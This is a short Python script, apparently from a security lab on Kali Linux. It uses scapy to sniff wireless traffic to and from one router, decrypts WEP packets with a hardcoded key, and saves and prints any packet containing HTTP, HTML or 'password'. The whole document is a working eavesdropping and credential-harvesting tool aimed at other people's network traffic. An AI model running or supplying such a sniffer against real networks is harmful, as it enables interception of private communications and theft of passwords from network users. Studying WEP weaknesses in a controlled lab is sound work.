from scapy.all import *
import decrypt

pkl = PcapWriter("/home/kali/Desktop/WEPpackets.pcap", append = True, sync = True)
router_MAC= "74:da:38:eb:6f:dc"
WEP_key = "ESAT2"
network_interface = "wlan1" #"wlan0"

def decryptAndFilter(p):
	if p.haslayer(Dot11WEP):
		dp = decrypt.decryptWEP(p,WEP_key)
		if "HTTP"in str(dp) or "HTML" in str(dp).upper() or "PASSWORD" in str(dp).upper(): #geen upper bij http
			pkl.write(p)
			print("\n"+10*"-------------------"+"\n")
			return dp
		
print("Sniffing started...")
sniff(iface=network_interface, filter="ether src "+router_MAC+" or ether dst "+router_MAC, prn=decryptAndFilter, store=0)

